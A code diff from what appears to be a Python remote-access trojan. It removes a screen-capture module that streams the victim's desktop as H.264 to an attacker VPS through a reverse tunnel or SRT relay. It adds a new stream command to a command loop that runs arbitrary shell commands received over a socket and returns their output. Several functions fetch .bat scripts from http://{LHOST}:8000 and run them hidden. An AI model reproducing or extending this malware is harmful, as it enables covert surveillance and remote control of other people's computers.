-        except Exception as e:
-            last = e
-            _s2_log("encoder open try %d FAILED: %r" % (i + 1, e))
-    raise RuntimeError("encoder open failed: %s" % last)
-
-
-def _s2_pick_encoder(w, h, fps):
-    """Tiered encoder pick: h264_mf (HW) > libx264 (universal) > mpeg4."""
-    import av
-    for name in ("h264_mf", "libx264", "mpeg4"):
-        if name not in av.codec.codecs_available:
-            continue
-        try:
-            _s2_make_encoder(name, w, h, fps, _s2_bitrate(w, h))
-            return name
-        except Exception:
-            continue
-    return None
-
-
-def _s2_grab_guarded(grab, timeout=2.0):
-    """Run a blocking grab() in a worker with a hard timeout.
-    Returns (frame, ok). On timeout/exception returns (None, False) so the
-    caller can fall back to GDI instead of stalling the encode loop.
-    NOTE: no 'with' block - shutdown(wait=True) would block joining the
-    still-stuck worker thread, recreating the hang. The worker thread is
-    abandoned on timeout (caller permanently switches to GDI afterwards)."""
-    import concurrent.futures as _cf
-    ex = _cf.ThreadPoolExecutor(max_workers=1)
-    try:
-        return ex.submit(grab).result(timeout=timeout), True
-    except _cf.TimeoutError:
-        return None, False
-    except Exception:
-        return None, False
-    finally:
-        ex.shutdown(wait=False)
-
-
-def _s2_session(writer, enc_name, grab, stop_cam, stop, info, use_gdi):
-    """One encode session on `writer` (TCP conn or SRT socket). Rebuilds the
-    encoder/mux at the current resolution and streams until stop, viewer
-    death, or a resolution DEGRADE (which keeps the same writer and rebuilds
-    the encoder/mux in place - SPS change is handled by the player).
-    Returns (grab, use_gdi): GDI fallback persists across sessions."""
-    import av            # after _s2_load_runtime: bundle or site-packages
-    from fractions import Fraction
-    w, h, fps = STREAM2_DEF_W, STREAM2_DEF_H, STREAM2_DEF_FPS
-    pts_n = 0   # monotonic PTS counter: never reset at the rate tick
-    info.update(state="streaming", viewers=1)
-    viewer_dead = False
-    _s2_log("session start %dx%d@%d bitrate=%d" % (
-        w, h, fps, _s2_bitrate(w, h)))
-    while not stop.is_set() and not viewer_dead:
-        try:
-            enc = _s2_make_encoder(enc_name, w, h, fps, _s2_bitrate(w, h))
-            mux = av.open(writer, "w", format="mpegts")
-            st = mux.add_stream("h264", rate=fps)
-            st.codec_context.extradata = enc.extradata or b""
-            _s2_log("enc open %s extradata=%dB" % (
-                enc_name, len(st.codec_context.extradata or b"")))
-            _s2_log("mux open mpegts")
-        except Exception as e:
-            info.update(state="failed: %s" % e)
-            _s2_log("enc/mux open FAILED: %r" % e)
-            viewer_dead = True
-            break
-        n_frames = 0
-        n_bytes = 0
-        none_ct = 0
-        pkt_ct = 0
-        first_log = False
-        t0 = time.time()
-        degrade = False
-        try:
-            while not stop.is_set() and not degrade:
-                # dxcam get_latest_frame() can block FOREVER when its DXGI
-                # backend silently fails (no exception). Run it with a hard
-                # timeout; on stall fall back to GDI so frames keep flowing.
-                if not use_gdi:
-                    frame, _ok = _s2_grab_guarded(grab, 2.0)
-                    if frame is None:
-                        use_gdi = True
-                        _s2_log("grab timeout/stall -> GDI fallback")
-                        try:
-                            stop_cam()
-                        except Exception:
-                            pass
-                        grab = _s2_gdi_grab
-                        info.update(state="streaming (GDI fallback)")
-                        continue
-                else:
-                    frame = grab()
-                if frame is None:
-                    none_ct += 1
-                    if none_ct == 1 or none_ct % 100 == 0:
-                        _s2_log("grab None x%d" % none_ct)
-                    time.sleep(0.01)
-                    continue
-                none_ct = 0
-                src = av.VideoFrame.from_ndarray(frame, format="bgr24")
-                scaled = src.reformat(width=w, height=h, format="yuv420p",
-                                      interpolation="BICUBIC")
-                scaled.pts = pts_n * 1_000_000 // fps
-                scaled.time_base = Fraction(1, 1_000_000)
-                n_pkts = 0
-                for pkt in enc.encode(scaled):
-                    n_pkts += 1
-                    pkt.stream = st
-                    try:
-                        mux.mux(pkt)
-                    except Exception as e:
-                        _s2_log("mux.mux FAILED: %r" % e)
-                        raise
-                    n_bytes += pkt.size
-                    pkt_ct += 1
-                    if pkt_ct <= 10 or pkt.is_keyframe or pkt_ct % 30 == 0:
-                        _s2_log("frame %d src=%s pkt=%dB%s pts=%s" % (
-                            n_frames, "gdi" if use_gdi else "dx", pkt.size,
-                            " KEY" if pkt.is_keyframe else "",
-                            pkt.pts if pkt.pts is not None else "-"))
-                if not first_log:
-                    first_log = True
-                    _s2_log("first frame -> %d pkt(s)" % n_pkts)
-                elif n_frames < 5 and n_pkts == 0:
-                    _s2_log("encode buffered frame %d (0 packets)" % n_frames)
-                n_frames += 1
-                pts_n += 1
-                now = time.time()
-                if now - t0 >= 5.0:
-                    real = n_frames / max(now - t0, 0.001)
-                    _s2_log("stats real=%.1ffps frames=%d bytes=%d "
-                            "writewait=%.1fs/%d" % (
-                                real, n_frames, n_bytes,
-                                writer.stall_s, writer.stall_n))
-                    writer.stall_s, writer.stall_n = 0.0, 0
-                    info.update(bytes=info.get("bytes", 0) + n_bytes,
-                                frames=info.get("frames", 0) + n_frames)
-                    if real < fps * 0.6 and not info.get("degraded")\
-                            and w > 640:
-                        w, h, fps = w // 2, h // 2, max(10, fps // 2)
-                        info.update(w=w, h=h, fps=fps, degraded=True)
-                        _s2_log("DEGRADE real=%.1ffps -> %dx%d@%d" % (
-                            real, w, h, fps))
-                        degrade = True
-                    else:
-                        n_frames, n_bytes, t0 = 0, 0, now
-        except OSError as e:
-            _s2_log("OSError in encode loop: %r" % e)
-        except Exception as e:
-            _s2_log("stream error: %r" % e)
-            info["last_error"] = str(e)   # survives the state overwrite below
-            info.update(state="stream error: %s" % e)
-        try:
-            mux.close()
-            _s2_log("mux closed")
-        except Exception as e:
-            _s2_log("mux.close FAILED: %r" % e)
-        # A viewer drop ends the session, but a resolution DEGRADE keeps the
-        # same connection: the rebuilt encoder/mux changes SPS and the player
-        # v3 detects it at the AU level and recreates its decoder in place -
-        # no reconnect. Killing the viewer here would restart the
-        # connect/disconnect cycle on every degrade.
-        if not degrade:
-            viewer_dead = True
-        _s2_log("session end degrade=%s -> viewer_dead=%s" % (
-            degrade, viewer_dead))
-    return grab, use_gdi
-
-
-
-def _s2_run(target_id: str, transport: str = "tcp") -> None:
-    """Stream thread: capture -> tiered H.264 -> MPEG-TS. transport="tcp"
-    (default) listens on 127.0.0.1:25900+id for the reverse-tunnel path;
-    transport="srt" sends straight to the VPS SRT relay (UDP :9000) - no
-    local listener and no tunnel. Encodes only while a viewer/relay is
-    connected; auto-degrades resolution once if the encoder cannot keep up."""
-    stop = _S2["stop"]
-    info = _S2["info"]
-    port = STREAM2_PORT_BASE + int(target_id)
-    info.update(id=target_id, port=port, transport=transport,
-                started=time.time(), encoder="?", state="starting",
-                w=STREAM2_DEF_W, h=STREAM2_DEF_H, fps=STREAM2_DEF_FPS,
-                viewers=0, bytes=0, frames=0, degraded=False)
-    _s2_log("run start id=%s transport=%s port=%d" % (
-        target_id, transport, port))
-
-    try:
-        _s2_load_runtime()   # bundle on embed runtimes, site-packages on dev
-        import av            # AFTER load_runtime: may come from the bundle
-        grab, stop_cam = _s2_capture()
-        _s2_log("runtime ok (av=%s)" % getattr(av, "__file__", "?"))
-        _s2_log("capture backend ready")
-    except Exception as e:
-        info.update(state="failed: %s" % e)
-        _s2_log("init FAILED: %r" % e)
-        print("stream2: %s" % e, file=sys.stderr)
-        return
-
-    lib = None
-    if transport == "srt":
-        try:
-            lib = _s2_load_srt()
-        except Exception as e:
-            lib = None
-            _s2_log("srt load FAILED: %r (TCP fallback)" % e)
-        if lib is None:
-            transport = "tcp"
-            info.update(transport="tcp")
-            _s2_log("SRT unavailable -> falling back to TCP")
-    _use_gdi = False   # flipped on if dxcam stalls/fails -> _s2_gdi_grab
-
-    srv = None
-    if transport == "tcp":
-        try:
-            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            srv.bind(("127.0.0.1", port))
-            srv.listen(1)
-            srv.settimeout(0.5)
-            _s2_log("listening 127.0.0.1:%d" % port)
-        except Exception as e:
-            stop_cam()
-            info.update(state="failed: bind %s" % e)
-            _s2_log("bind FAILED: %r" % e)
-            return
-    else:
-        _s2_log("transport=srt: no local listener (relay terminates "
-                "UDP :%d -> TCP on the VPS)" % STREAM2_SRT_PORT)
-
-    enc_name = _s2_pick_encoder(STREAM2_DEF_W, STREAM2_DEF_H,
-                                STREAM2_DEF_FPS)
-    if not enc_name:
-        stop_cam()
-        if srv is not None:
-            try:
-                srv.close()
-            except OSError:
-                pass
-        info.update(state="failed: no usable video encoder in PyAV")
-        return
-    info["encoder"] = enc_name
-    print("stream2: encoder=%s from %s" % (enc_name, av.__file__),
-          file=sys.stderr)
-    _s2_log("encoder=%s" % enc_name)
-    info.update(state="ready - waiting for viewer" if transport == "tcp"
-                else "ready - connecting to relay")
-
-    if transport == "srt":
-        while not stop.is_set():
-            # One socket per attempt: once a peer is closed or rejected the
-            # socket must never be reused (libsrt can crash on continued use).
-            u = _s2_srt_connect(lib, target_id)
-            if u is None:
-                if stop.wait(3.0):
-                    break
-                continue
-            writer = _S2SRTWriter(lib, u)
-            grab, _use_gdi = _s2_session(writer, enc_name, grab, stop_cam,
-                                         stop, info, _use_gdi)
-            writer.close()
-            info.update(viewers=0)
-            if stop.is_set():
-                break
-            info.update(state="ready - reconnect relay")
-            _s2_log("srt session ended; reconnect in 3s")
-            if stop.wait(3.0):
-                break
-    else:
-        while not stop.is_set():
-            try:
-                conn, _ = srv.accept()
-            except socket.timeout:
-                continue
-            except OSError:
-                break
-            if conn is None:
-                continue
-            # No send timeout: a slow viewer (websockify/browser backpressure,
-            # Send-Q filling) must be THROTTLED, not killed - any settimeout
-            # also governs sendall() and raised socket.timeout on stalls,
-            # which killed the viewer every few seconds. Dead viewers are
-            # detected by TCP keepalive (~30s) instead.
-            conn.settimeout(None)
-            _s2_log("viewer accepted peer=%s" % (conn.getpeername(),))
-            try:
-                # Bump the send buffer past the default 64KB so a ~70KB GOP
-                # keyframe write doesn't wedge against the send window and
-                # stall sendall() into repeated backpressure stalls at every
-                # GOP boundary.
-                conn.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1 << 20)
-            except OSError:
-                pass
-            try:
-                conn.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-                if os.name == "nt":
-                    conn.ioctl(socket.SIO_KEEPALIVE_VALS, (1, 15000, 5000))
-                else:
-                    conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 15)
-                    conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 5)
-                    conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 3)
-            except OSError:
-                pass
-            try:
-                conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-            except OSError:
-                pass
-            try:
-                sndbuf = conn.getsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF)
-            except OSError:
-                sndbuf = -1
-            _s2_log("socket opts: SO_SNDBUF cfg=1MB actual=%d "
-                    "keepalive=on nodelay=on" % sndbuf)
-            writer = _S2SockWriter(conn)
-            grab, _use_gdi = _s2_session(writer, enc_name, grab, stop_cam,
-                                         stop, info, _use_gdi)
-            writer.close()
-            try:
-                conn.close()
-            except OSError:
-                pass
-            info.update(viewers=0, state="ready - waiting for viewer")
-            _s2_log("viewer closed; waiting for next")
-    _s2_log("stream2 exiting loop")
-    if srv is not None:
-        try:
-            srv.close()
-        except OSError:
-            pass
-    stop_cam()
-    info.update(state="stopped")
-    _s2_log("stream2 stopped")
-
-
-
-def deploy_stream2(cmd: str) -> bytes:
-    """'stream2 [id] [srt]': start the python-native H.264 stream. id N maps
-    to VPS port 25900+N (TCP mode: reverse tunnel, like VNC) or, with the
-    optional 'srt' transport keyword, straight to the VPS SRT relay
-    (UDP :9000) which answers on TCP 127.0.0.1:25900+N - no tunnel needed."""
-    parts = cmd.split()
-    target_id = parts[1] if len(parts) > 1 and parts[1].isdigit() else "1"
-    transport = ("srt" if len(parts) > 2 and parts[2].lower() == "srt"
-                 else "tcp")
-    if not target_id.isdigit():
-        return b"[!] usage: stream2 [id] [srt]\n" + MARKER
-    if transport == "srt" and not _s2_srt_name():
-        transport = "tcp"
-        _s2_log("srt requested but no bundle for this arch -> TCP")
-    with _S2["lock"]:
-        th = _S2["th"]
-        if th and th.is_alive():
-            return (b"[!] stream2 already running (id " +
-                    str(_S2["info"].get("id", "?")).encode() +
-                    b") - use 'stop stream2' first\n" + MARKER)
-        _S2["stop"].clear()
-        _S2["th"] = threading.Thread(target=_s2_run,
-                                     args=(target_id, transport),
-                                     daemon=True, name="s2-" + target_id)
-        _S2["th"].start()
-        _s2_log("deploy id=%s transport=%s" % (target_id, transport))
-    p = STREAM2_PORT_BASE + int(target_id)
-    if transport == "srt":
-        return ("[+] stream2 started (id %s, srt transport)\n"
-                "    relay:   srt://%s:%d/udp -> tcp 127.0.0.1:%d on VPS\n"
-                "    play:    vlc tcp://%s:%d (relay port / websockify)\n"
-                % (target_id, LHOST, STREAM2_SRT_PORT, p, LHOST, p)).encode() + MARKER
-    # best-effort: auto-start the reverse tunnel like deploy_vnc does; if the
-    # bat cannot be fetched the streamer still works (tunnel can be added later)
-    tunnel_note = ""
-    try:
-        root = _base_dir()
-        if root:
-            err = _run_hidden(
-                os.path.join(root, "stream2"),
-                "stream2_target_setup.bat",
-                f"http://{LHOST}:8000/stream2_target_setup.bat",
-                target_id,
-            )
-            if err:
-                tunnel_note = " | tunnel: NOT auto-started (%s)" % err
-    except Exception as e:
-        tunnel_note = " | tunnel: NOT auto-started (%s)" % e
-    return ("[+] stream2 started (id %s)%s\n"
-            "    local:  tcp://127.0.0.1:%d\n"
-            "    VPS:    127.0.0.1:%d (needs reverse tunnel, like VNC)\n"
-            "    play:   vlc tcp://<tunnel-end>:<port>\n"
-            % (target_id, tunnel_note, p, p)).encode() + MARKER
-
-
-
-def stop_stream2(cmd: str) -> bytes:
-    """'stop stream2 [id]': stop the python-native stream thread."""
-    with _S2["lock"]:
-        th = _S2["th"]
-        if not th or not th.is_alive():
-            return b"[*] stream2 not running\n" + MARKER
-        tinfo = dict(_S2["info"])
-        _S2["stop"].set()
-        _s2_log("stop requested")
-    th.join(timeout=8)
-    _s2_log("stop joined alive=%s" % th.is_alive())
-    with _S2["lock"]:
-        _S2["th"] = None
-    # best-effort tear down: only TCP mode has a reverse tunnel to stop
-    if tinfo.get("transport", "tcp") == "tcp":
-        try:
-            root = _base_dir()
-            if root:
-                _run_hidden(
-                    os.path.join(root, "stream2"),
-                    "stream2_target_stop.bat",
-                    f"http://{LHOST}:8000/stream2_target_stop.bat",
-                    str(tinfo.get("id") or 1),
-                )
-        except Exception:
-            pass
-    return b"[+] stream2 stopped\n" + MARKER
-
-
-
-def stream2_status() -> bytes:
-    """'stream2 status': report streamer state."""
-    with _S2["lock"]:
-        th = _S2["th"]
-        info = dict(_S2["info"])
-    if not th or not th.is_alive():
-        st = info.get("state")
-        if st and st.startswith("failed"):
-            return (("[*] stream2: not running (last error: %s)\n" % st)
-                    .encode() + MARKER)
-        return b"[*] stream2: not running\n" + MARKER
-    t = info.get("transport", "tcp")
-    lines = ["[*] stream2: id=%s transport=%s state=%s" % (
-        info.get("id", "?"), t, info.get("state", "?"))]
-    lines.append("    encoder:  %s" % info.get("encoder", "?"))
-    lines.append("    video:    %sx%s @ %s fps%s" % (
-        info.get("w"), info.get("h"), info.get("fps"),
-        " (degraded)" if info.get("degraded") else ""))
-    lines.append("    viewer:   %s" % ("CONNECTED" if info.get("viewers")
-                                       else "waiting"))
-    lines.append("    uptime:   %ds   bytes: %s" % (
-        int(time.time() - info.get("started", time.time())),
-        info.get("bytes", 0)))
-    if t == "srt":
-        lines.append("    stream:   srt://%s:%d/udp -> relay" % (
-            LHOST, STREAM2_SRT_PORT))
-    else:
-        lines.append("    stream:   tcp://127.0.0.1:%s" % info.get("port", "?"))
-    if info.get("last_error"):
-        lines.append("    last_err: %s" % info["last_error"])
-    ring = _S2.get("log") or []
-    tail = ring[-60:]
-    lines.append("    --- log tail (%d/%d) ---" % (len(tail), len(ring)))
-    lines.extend("    " + ln for ln in tail)
-    return ("\n".join(lines) + "\n").encode() + MARKER
-
+        line = f"netvnc stream: not running (phase={_stream_state.get('phase')})"
+    lines = [line]
+    if _stream_state.get("last_error"):
+        lines.append(f"last_error: {_stream_state['last_error']}")
+    node = _node_exe()
+    lines.append(f"node: {node if node else 'not installed'}")
+    script = os.path.join(_base_dir(), INSTALL_DIR_NAME, DESK_DIR,
+                          "stream-video-script.js")
+    lines.append("bundle: " + ("OK " + os.path.dirname(script)
+                                if os.path.exists(script) else "not installed"))
+    lines.append(f"viewer: {VIEWER_BASE}/?room={room}")
+    return "\n".join(lines)
 
 
 def execute_command(cmd: str) -> bytes:
     """Run a shell command and return its output. Handles cd persistently."""
+    low = cmd.strip().lower()
+
+    # netvnc stream dispatch (before generic shell)
+    if low == "stream" or low.startswith("stream "):
+        parts = cmd.split()
+        if len(parts) >= 2 and parts[1].lower() == "status":
+            return (stream_status() + "\n").encode() + MARKER
+        if len(parts) >= 2 and parts[1].lower() == "stop":
+            return (stop_stream() + "\n").encode() + MARKER
+        room = parts[1] if len(parts) >= 2 and not parts[1].lower().startswith("-") else "default"
+        return (deploy_stream(room) + "\n").encode() + MARKER
+    if low in ("stream stop", "stop stream", "stopstream"):
+        return (stop_stream() + "\n").encode() + MARKER
+
     # Handle cd internally so the working directory persists between commands
     if cmd.lower() == "cd" or cmd.lower().startswith("cd "):
         try:
@@ -1705,24 +774,7 @@ def connect() -> None:
                 if not cmd:
                     continue
 
-                low = cmd.lower()
-                if low == "stream2 status" or low == "s2status":
-                    output = stream2_status()
-                elif (low == "stop stream2" or low.startswith("stop stream2 ")
-                        or low == "stopstream2" or low.startswith("stopstream2 ")):
-                    output = stop_stream2(cmd)
-                elif low == "stream2" or low.startswith("stream2 "):
-                    output = deploy_stream2(cmd)
-                elif (low == "streams" or low.startswith("streams ")
-                        or low == "list streams" or low.startswith("list streams ")):
-                    output = vnc_status()
-                elif (low == "stop stream" or low.startswith("stop stream ")
-                        or low == "stopstream" or low.startswith("stopstream ")):
-                    output = stop_vnc(cmd)
-                elif low == "stream" or low.startswith("stream "):
-                    output = deploy_vnc(cmd)
-                else:
-                    output = execute_command(cmd)
+                output = execute_command(cmd)
                 sock.sendall(output)
         except (ConnectionResetError, OSError):
             pass
